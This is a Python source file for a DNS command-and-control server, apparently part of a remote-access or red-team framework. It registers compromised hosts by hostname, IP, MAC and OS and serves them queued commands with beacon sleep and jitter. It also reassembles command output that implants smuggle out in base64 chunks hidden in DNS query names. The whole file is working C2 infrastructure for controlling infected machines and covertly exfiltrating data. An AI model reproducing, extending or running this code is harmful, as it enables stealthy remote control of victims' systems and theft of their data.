"""DNS C2 channel server.

Protocol (UDP on port 15353 by default):

  POLL (implant → server):
    Query type : TXT
    Query name : {target_id}.poll.{C2_DNS_DOMAIN}
    Response   : TXT record whose strings concatenate to a base64-encoded
                 JSON object.  Both cases share the same envelope:

                   No pending command:
                     {"sleep": <int>, "jitter": <float>}

                   Pending command:
                     {"id": "<cmd_id>", "command": "<payload>",
                      "sleep": <int>, "jitter": <float>}

                 The implant checks for the presence of "id" to decide
                 whether a command was delivered.  It always reads
                 "sleep" and "jitter" to compute its next check-in delay:
                   delay = sleep * uniform(1 - jitter, 1 + jitter)

  REGISTER (implant → server):
    Query type : TXT
    Query name : {b64_chunk}.{chunk_idx}.{total_chunks}.reg.{C2_DNS_DOMAIN}
    Response   : Intermediate chunks: TXT "OK"
                 Final chunk: TXT record with base64-encoded JSON:
                   {"target_id": "<uuid>"}
    Notes      : Registration data (hostname, ip, mac, os) is JSON-encoded,
                 base64url-encoded, then split into ≤ 50-char chunks.
                 The server reassembles and registers on the final chunk.

  RESULT CHUNK (implant → server):
    Query type : TXT
    Query name : {b64_chunk}.{chunk_idx}.{total_chunks}.{cmd_id}.res.{C2_DNS_DOMAIN}
    Response   : TXT "OK"
    Notes      : chunk_idx is 0-based.  The implant splits the
                 base64-encoded output into URL-safe, dot-free chunks of
                 ≤ 50 chars, then sends one query per chunk.  The server
                 reassembles once all chunks arrive.
"""

import base64
import json
import os
import socketserver
import threading
from datetime import datetime, timezone
from socketserver import UDPServer
from threading import Thread
from time import sleep

from dnslib import DNSRecord, QTYPE, RR, TXT
from sqlmodel import Session, select

from backend.classes.database import engine
from backend.models.command import Command
from backend.models.target import Target
from .server import Server

# Domain the C2 DNS server answers for.  Set via env var C2_DNS_DOMAIN.
C2_DOMAIN: str = os.getenv("C2_DNS_DOMAIN", "c2.local")

# In-memory assembly buffer: {cmd_id: {chunk_idx: b64_chunk_str}}
_result_buffer: dict[str, dict[int, str]] = {}
_result_lock = threading.Lock()

# In-memory assembly buffer for registration chunks: {client_addr: {chunk_idx: b64_chunk_str}}
_reg_buffer: dict[str, dict[int, str]] = {}
_reg_lock = threading.Lock()


class _DNSHandler(socketserver.BaseRequestHandler):
    """One instance per incoming UDP datagram."""

    # ── Entry point ───────────────────────────────────────────────────

    def handle(self) -> None:
        raw_data: bytes = self.request[0]
        sock = self.request[1]

        try:
            request = DNSRecord.parse(raw_data)
        except Exception as ex:
            print(f"Failed to parse DNS request from {self.client_address} {str(ex)}")
            return

        reply = request.reply()
        qname: str = str(request.q.qname).rstrip(".")

        if not qname.endswith(C2_DOMAIN):
            sock.sendto(reply.pack(), self.client_address)
            return

        # Strip trailing ".{C2_DOMAIN}"
        subdomain = qname[: len(qname) - len(C2_DOMAIN) - 1]
        parts = subdomain.split(".")

        # Dispatch ── last label determines the action
        action = parts[-1] if parts else ""

        if action == "poll" and len(parts) >= 2:
            target_id = ".".join(parts[:-1])
            self._handle_poll(request, reply, target_id)

        elif action == "reg" and len(parts) >= 3:
            # {b64_chunk}.{chunk_idx}.{total_chunks}.reg
            try:
                total = int(parts[-2])
                idx = int(parts[-3])
                b64_chunk = "".join(parts[:-3])
                self._handle_reg_chunk(request, reply, idx, total, b64_chunk)
            except (ValueError, IndexError):
                pass

        elif action == "res" and len(parts) >= 4:
            # {b64_chunk}.{chunk_idx}.{total_chunks}.{cmd_id}.res
            cmd_id = parts[-2]
            try:
                total = int(parts[-3])
                idx = int(parts[-4])
                b64_chunk = "".join(parts[:-4])
                self._handle_result_chunk(reply, cmd_id, idx, total, b64_chunk)
            except (ValueError, IndexError):
                pass

        sock.sendto(reply.pack(), self.client_address)

    # ── Registration handler ────────────────────────────────────────────

    def _handle_reg_chunk(
        self,
        request: DNSRecord,
        reply,
        idx: int,
        total: int,
        b64_chunk: str,
    ) -> None:
        client_key = self.client_address[0]

        with _reg_lock:
            _reg_buffer.setdefault(client_key, {})[idx] = b64_chunk

            with open("dns_log.txt", "a") as f:
                f.write(f"{datetime.now()}: {client_key} {idx} {total} {b64_chunk}\n")
                f.write(f"Current buffer for {client_key}: {_reg_buffer[client_key]}\n")

            if idx < total - 1:
                # Still waiting for more chunks — ACK this one
                reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT([b"OK"])))
                return

            with open("dns_log.txt", "a") as f:
                f.write(f"Received all chunks for {client_key}. Buffer: {_reg_buffer[client_key]}\n")
                f.write(f"Assembling for {client_key}...\n")

            # All chunks received — reassemble
            assembled_b64 = "".join(
                _reg_buffer[client_key].get(i, "") for i in range(total)
            )
            with open("dns_log.txt", "a") as f:
                f.write(f"Reassembled registration data from {self.client_address} {assembled_b64}\n")
            del _reg_buffer[client_key]

        try:
            data = json.loads(base64.b64decode(assembled_b64 + "==").decode())
            with open("dns_log.txt", "a") as f:
                f.write(f"Successfully parsed registration data from {self.client_address} {data}\n")
        except Exception as ex:
            with open("dns_log.txt", "a") as f:
                f.write(f"Failed to parse registration data from {self.client_address} {str(ex)}\n")
            reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT([b"ERR"])))
            return

        # Register or re-register the target (mirrors agent_routes.register)
        with Session(engine) as session:
            mac = data.get("mac_address", "")
            hostname = data.get("hostname", "")
            ip_address = data.get("ip_address", "") or self.client_address[0]

            existing = None
            if mac:
                existing = session.exec(
                    select(Target).where(Target.mac_address == mac)
                ).first()
            elif hostname:
                existing = session.exec(
                    select(Target).where(
                        Target.hostname == hostname,
                        Target.ip_address == ip_address,
                    )
                ).first()

            if existing:
                existing.ip_address = ip_address or existing.ip_address
                existing.os = data.get("os", "") or existing.os
                existing.status = "active"
                existing.communication_channel = "dns"
                existing.last_seen = datetime.now(timezone.utc)
                session.add(existing)
                session.commit()
                target_id = existing.id
            else:
                target = Target(
                    hostname=hostname,
                    ip_address=ip_address,
                    mac_address=mac,
                    os=data.get("os", ""),
                    status="active",
                    communication_channel="dns",
                )
                session.add(target)
                session.commit()
                session.refresh(target)
                target_id = target.id

        resp_json = json.dumps({"target_id": target_id})
        resp_b64 = base64.b64encode(resp_json.encode()).decode()
        chunks = [resp_b64[i: i + 255].encode() for i in range(0, len(resp_b64), 255)]
        reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(chunks)))

    # ── Poll handler ──────────────────────────────────────────────────

    def _handle_poll(self, request: DNSRecord, reply, target_id: str) -> None:
        with Session(engine) as session:
            target = session.get(Target, target_id)
            if not target:
                reply.add_answer(
                    RR(request.q.qname, QTYPE.TXT, rdata=TXT([b"UNKNOWN"]))
                )
                return

            target.last_seen = datetime.now(timezone.utc)
            if target.status != "inactive":
                target.status = "active"
            session.add(target)

            # Build query for pending commands
            pending_q = session.exec(
                select(Command)
                .where(Command.target_id == target_id, Command.status == "pending")
                .order_by(Command.created_at)  # type: ignore[arg-type]
            ).all()

            # Find the first deliverable command (system commands always delivered)
            pending = None
            for cmd in pending_q:
                if target.status == "inactive" and cmd.module_name != "system":
                    continue
                pending = cmd
                break

            if not pending:
                envelope = json.dumps({
                    "sleep": target.beacon_interval,
                    "jitter": target.beacon_jitter,
                })
                b64 = base64.b64encode(envelope.encode()).decode()
                chunks = [b64[i: i + 255].encode() for i in range(0, len(b64), 255)]
                reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(chunks)))
                session.commit()
                return

            # Encode: JSON → UTF-8 bytes → base64 string
            payload = json.dumps({
                "id": pending.id,
                "command": pending.command,
                "sleep": target.beacon_interval,
                "jitter": target.beacon_jitter,
            })
            b64 = base64.b64encode(payload.encode()).decode()

            # Split into ≤ 255-byte strings (DNS TXT per-string limit)
            chunks = [b64[i: i + 255].encode() for i in range(0, len(b64), 255)]
            reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(chunks)))

            pending.status = "sent"
            session.add(pending)
            session.commit()

    # ── Result chunk handler ──────────────────────────────────────────

    def _handle_result_chunk(
        self,
        reply,
        cmd_id: str,
        idx: int,
        total: int,
        b64_chunk: str,
    ) -> None:
        reply.add_answer(RR(reply.q.qname, QTYPE.TXT, rdata=TXT([b"OK"])))

        with _result_lock:
            _result_buffer.setdefault(cmd_id, {})[idx] = b64_chunk

            if len(_result_buffer[cmd_id]) < total:
                return  # still waiting for more chunks

            # All chunks received — reassemble and persist
            assembled_b64 = "".join(
                _result_buffer[cmd_id].get(i, "") for i in range(total)
            )
            del _result_buffer[cmd_id]

        try:
            output = base64.b64decode(assembled_b64 + "==").decode(errors="replace")
        except Exception:
            output = assembled_b64

        with Session(engine) as session:
            cmd = session.get(Command, cmd_id)
            if cmd:
                cmd.output = output
                cmd.status = "completed"
                session.add(cmd)
                session.commit()


# ── Internal UDP server wrapper ───────────────────────────────────────────────

class _DNSServerInternal:
    def __init__(self, host: str = "0.0.0.0", port: int = 15353) -> None:
        self._server = UDPServer((host, port), _DNSHandler)

    def start(self) -> None:
        self._server.serve_forever()

    def stop(self) -> None:
        print("Stopping DNS C2 server...")
        self._server.shutdown()
        self._server.server_close()
        print("DNS C2 server stopped.")


# ── Public-facing threaded wrapper ────────────────────────────────────────────

class DNSServer(Server):
    def __init__(self, host: str = "0.0.0.0", port: int = 15353) -> None:
        super().__init__()
        self.__host = host
        self.__port = port
        self.__server = _DNSServerInternal(host=host, port=port)
        self._thread = Thread(target=self.__server.start, daemon=True)

    def start(self) -> None:
        print(f"DNS C2 server starting at {self.__host}:{self.__port}")
        self._thread.start()

    def stop(self) -> None:
        self.__server.stop()
        self._thread.join(timeout=5)


if __name__ == "__main__":
    server = DNSServer()
    try:
        server.start()
    except Exception as e:
        print(f"Error starting DNS server: {e}")

    while True:
        try:
            sleep(1)
        except KeyboardInterrupt:
            server.stop()
            break
